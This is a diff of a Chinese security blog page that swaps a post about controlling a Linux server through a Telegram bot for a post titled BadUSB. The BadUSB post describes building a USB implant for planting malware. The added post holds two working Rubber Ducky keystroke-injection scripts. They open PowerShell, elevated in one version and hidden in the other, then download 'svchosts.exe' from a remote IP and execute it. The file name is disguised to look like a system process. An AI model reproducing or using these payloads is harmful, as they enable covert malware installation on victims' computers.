@@ -84,27 +84,21 @@
 
 
 
-<meta name="description" content="无意发现github有趣的项目，调用了Telegram API机器人来执行你远程服务器命令。刚好手里有一台Kali外网，可以用来做一些简单的信息扫描、在不方便用电脑的情况下，想要实现多大的效果取决于你写的如何。">
+<meta name="description">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Telegram远程执行Linux命令">
-<meta property="og:url" content="http://yoursite.com/2017/08/01/Telegram远程执行Linux命令/index.html">
+<meta property="og:title" content="BadUSB">
+<meta property="og:url" content="http://yoursite.com/2017/08/19/BadUSB/index.html">
 <meta property="og:site_name" content="EvilAnne's Blog">
-<meta property="og:description" content="无意发现github有趣的项目，调用了Telegram API机器人来执行你远程服务器命令。刚好手里有一台Kali外网，可以用来做一些简单的信息扫描、在不方便用电脑的情况下，想要实现多大的效果取决于你写的如何。">
-<meta property="og:image" content="http://i.imgur.com/7yByPXI.jpg">
-<meta property="og:image" content="http://i.imgur.com/R1bLOJt.jpg">
-<meta property="og:image" content="http://i.imgur.com/qDxBIKw.jpg">
-<meta property="og:image" content="http://i.imgur.com/6iRQNDF.jpg">
-<meta property="og:image" content="http://i.imgur.com/Jnmmb8P.jpg">
-<meta property="og:image" content="http://i.imgur.com/7LuB12L.jpg">
-<meta property="og:image" content="http://i.imgur.com/4ixXrn5.jpg">
-<meta property="og:image" content="http://i.imgur.com/im9aAZz.jpg">
-<meta property="og:image" content="http://i.imgur.com/9xwKxiG.jpg">
-<meta property="og:image" content="http://i.imgur.com/aNAFMFK.jpg">
-<meta property="og:updated_time" content="2017-08-01T12:36:00.831Z">
+<meta property="og:description">
+<meta property="og:image" content="http://i.imgur.com/grWLqbs.jpg">
+<meta property="og:image" content="http://i.imgur.com/6b3KzS6.jpg">
+<meta property="og:image" content="http://i.imgur.com/aPw2hSE.jpg">
+<meta property="og:image" content="http://i.imgur.com/SH9QoqS.jpg">
+<meta property="og:updated_time" content="2017-08-19T08:55:46.240Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Telegram远程执行Linux命令">
-<meta name="twitter:description" content="无意发现github有趣的项目，调用了Telegram API机器人来执行你远程服务器命令。刚好手里有一台Kali外网，可以用来做一些简单的信息扫描、在不方便用电脑的情况下，想要实现多大的效果取决于你写的如何。">
-<meta name="twitter:image" content="http://i.imgur.com/7yByPXI.jpg">
+<meta name="twitter:title" content="BadUSB">
+<meta name="twitter:description">
+<meta name="twitter:image" content="http://i.imgur.com/grWLqbs.jpg">
 
 
 
@@ -133,7 +127,7 @@
     })();
 </script>
 
-  <title> Telegram远程执行Linux命令 | EvilAnne's Blog </title>
+  <title> BadUSB | EvilAnne's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -273,7 +267,7 @@
             
             
               
-                Telegram远程执行Linux命令
+                BadUSB
               
             
           </h1>
@@ -285,8 +279,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-08-01T20:35:30+08:00" content="2017-08-01">
-              2017-08-01
+            <time itemprop="dateCreated" datetime="2017-08-19T16:55:11+08:00" content="2017-08-19">
+              2017-08-19
             </time>
           </span>
 
@@ -315,8 +309,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2017/08/01/Telegram远程执行Linux命令/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/08/01/Telegram远程执行Linux命令/" itemprop="commentsCount"></span>
+                <a href="/2017/08/19/BadUSB/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/08/19/BadUSB/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -339,21 +333,24 @@
       
 
       
-        <p><img src="http://i.imgur.com/7yByPXI.jpg" alt=""></p>
-<p>无意发现github有趣的项目，调用了<code>Telegram API</code>机器人来执行你远程服务器命令。<br>刚好手里有一台Kali外网，可以用来做一些简单的信息扫描、在不方便用电脑的情况下，想要实现多大的效果取决于你写的如何。</p>
+        <p><img src="http://i.imgur.com/grWLqbs.jpg" alt=""></p>
 <a id="more"></a>
-<p>首先需要关注<code>botfather</code><br><code>https://telegram.me/botfather</code></p>
-<p>可以先插<code>/help</code>获取帮助手册，通过<code>/newbot</code>创建机器人并获得机器人token<br><img src="http://i.imgur.com/R1bLOJt.jpg" alt=""></p>
-<p>命名要求一后缀一定要下划线加bot如：<code>FRuck_bot</code><br><img src="http://i.imgur.com/qDxBIKw.jpg" alt=""></p>
-<p>向我们机器人发送第一条短信，他会识别我们的ID,在此之前你的Telegram需要设置一下ID，这里被坑了好久，不然在执行python脚本一直添加Token无回显<br><img src="http://i.imgur.com/6iRQNDF.jpg" alt=""></p>
-<p><code>cd /home &amp;&amp; git clone https://github.com/fnzv/trsh.git &amp;&amp; cd trsh &amp;&amp; bash install.sh</code></p>
-<p>如果你的系统是Kali不要着急运行<code>install.sh</code>,<code>/root/trsh/supervisor/conf.d</code>、修改当前路径，作者默认测试环境是<code>ubuntu16</code>,所以这里需要修改一下：<br><img src="http://i.imgur.com/Jnmmb8P.jpg" alt=""></p>
-<p><img src="http://i.imgur.com/7LuB12L.jpg" alt=""><br>输入上面发送给你的 <code>BOT Token</code> 之后会获取你发送短信的ID，此时继续</p>
-<p>运行<code>controller.py</code> 没有报错说明运行成功，反回<code>Telegram</code>测试：<br><img src="http://i.imgur.com/4ixXrn5.jpg" alt=""></p>
-<p>默认的命令不多，按照套路添加所需要的命令：<br><img src="http://i.imgur.com/im9aAZz.jpg" alt=""></p>
-<p><img src="http://i.imgur.com/9xwKxiG.jpg" alt=""></p>
-<p><img src="http://i.imgur.com/aNAFMFK.jpg" alt=""></p>
-<p>这是电脑版本的、可以在手机运行。</p>
+<p>接到任务需要制作一款U盘植马工具，记得之前搞过<code>Arduino Leonardo</code>效果不是太理想，折腾的不算太久，在阅读各种相关文章后自己也学到了很多，此次先是同事买了一个<code>SanDisk</code>U盘，因为参考连接是支持这种的：<a href="https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices" target="_blank" rel="external">Known Supported Devices</a>，以及还有：<a href="https://www.pentestingshop.com/pentesting/make-your-own-usb-rubber-ducky-using-a-normal-usb-stick/" target="_blank" rel="external">Make your own USB Rubber Ducky using a normal USB stick</a><br><a href="https://github.com/brandonlw/Psychson" target="_blank" rel="external">GitHub Psychson Link</a><br>搞了一天才发现这种板子根本就不能支持。<br>这里有个制作视频很详细：<a href="https://www.youtube.com/watch?v=jfIkrzxhAXg" target="_blank" rel="external">BadUSB - HID Attack</a></p>
+<p>后来买了这个：<br><img src="http://i.imgur.com/6b3KzS6.jpg" alt=""></p>
+<p>880个人认为觉得不值，还好花的不是我的钱。</p>
+<p><img src="http://i.imgur.com/aPw2hSE.jpg" alt=""></p>
+<p><img src="http://i.imgur.com/SH9QoqS.jpg" alt=""></p>
+<ul>
+<li>1.开发板，带了一个128M内存卡</li>
+<li>2.读卡器</li>
+<li>3.壳</li>
+<li>4.usb转手机</li>
+<li>5.外壳</li>
+</ul>
+<p>通过网站生成Payload之后下载<code>inject.bin</code>放入内存卡中就可以使用，就是这么简单。<br><a href="https://ducktoolkit.com/payload/?os_type=windows" target="_blank" rel="external">Payload Generator</a></p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">REM Windows 10: Poweshell administrator download and execute file</span></span><br><span class="line"><span class="comment">REM</span></span><br><span class="line"><span class="comment">REM start of script</span></span><br><span class="line"><span class="comment">REM</span></span><br><span class="line"><span class="comment">REM let the HID enumerate</span></span><br><span class="line">DELAY <span class="number">1000</span></span><br><span class="line">GUI r</span><br><span class="line">DELAY <span class="number">200</span></span><br><span class="line"><span class="comment">REM my best attempt at a elevated powershell instance</span></span><br><span class="line">STRING powershell <span class="built_in">Start</span>-Process powershell -Verb runAs</span><br><span class="line">ENTER</span><br><span class="line">DELAY <span class="number">500</span></span><br><span class="line">ALT y</span><br><span class="line">ENTER</span><br><span class="line">DELAY <span class="number">1000</span></span><br><span class="line">STRING <span class="built_in">mode</span> <span class="built_in">con</span>:cols=<span class="number">14</span> lines=<span class="number">1</span> </span><br><span class="line">ENTER</span><br><span class="line">ALT SPACE </span><br><span class="line">DELAY <span class="number">750</span>  </span><br><span class="line">STRING m </span><br><span class="line">DELAY <span class="number">750</span>   </span><br><span class="line">DOWNARROW</span><br><span class="line">REPEAT <span class="number">100</span></span><br><span class="line">ENTER </span><br><span class="line">DELAY <span class="number">700</span></span><br><span class="line">STRING $down = New-Object System.<span class="built_in">Net</span>.WebClient; $url = 'http://<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>:<span class="number">7651</span>/svchosts.exe'; $file = 'svchosts.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); <span class="keyword">exit</span>;</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure>
+<p>但执行的效果比较差，经过n次重复的调试，终于离自己离想中的代码差不多。</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">REM Windows 10: Poweshell administrator download and execute file</span></span><br><span class="line"><span class="comment">REM</span></span><br><span class="line"><span class="comment">REM start of script</span></span><br><span class="line"><span class="comment">REM</span></span><br><span class="line"><span class="comment">REM let the HID enumerate</span></span><br><span class="line">DELAY <span class="number">1000</span></span><br><span class="line">GUI r</span><br><span class="line">DELAY <span class="number">200</span></span><br><span class="line">STRING powershell -WindowStyle Hidden $down = New-Object System.<span class="built_in">Net</span>.WebClient; $url = 'http://<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>:<span class="number">7651</span>/svchosts.exe'; $file = 'svchosts.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); <span class="keyword">exit</span>;</span><br><span class="line">ENTER</span><br><span class="line">CTRL D </span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -378,17 +375,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/07/24/身体是一切/" rel="next" title="身体是一切">
-                <i class="fa fa-chevron-left"></i> 身体是一切
+              <a href="/2017/08/11/Python基础/" rel="next" title="Python基础">
+                <i class="fa fa-chevron-left"></i> Python基础
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/08/06/2017下半年锻炼计划表/" rel="prev" title="2017下半年锻炼计划表">
-                2017下半年锻炼计划表 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -414,8 +407,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2017/08/01/Telegram远程执行Linux命令/"
-           data-title="Telegram远程执行Linux命令" data-url="http://yoursite.com/2017/08/01/Telegram远程执行Linux命令/">
+      <div class="ds-thread" data-thread-key="2017/08/19/BadUSB/"
+           data-title="BadUSB" data-url="http://yoursite.com/2017/08/19/BadUSB/">
       </div>
     
   </div>
